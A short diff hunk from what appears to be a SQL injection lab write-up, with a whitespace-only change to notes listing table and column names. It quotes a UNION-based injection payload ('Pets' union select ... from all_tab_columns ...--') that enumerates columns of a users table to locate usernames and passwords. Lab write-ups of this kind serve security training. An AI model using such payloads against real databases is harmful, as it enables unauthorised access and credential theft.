@@ -32,5 +32,5 @@ Table name `USERS_YXUZFJ`
 `Pets' union select COLUMN_NAME,null from all_tab_columns where table_name='USERS_YXUZFJ'--`
 Columns:
 
-PASSWORD_ODOKFU
+PASSWORD_ODOKFU  
 USERNAME_DZRUHS
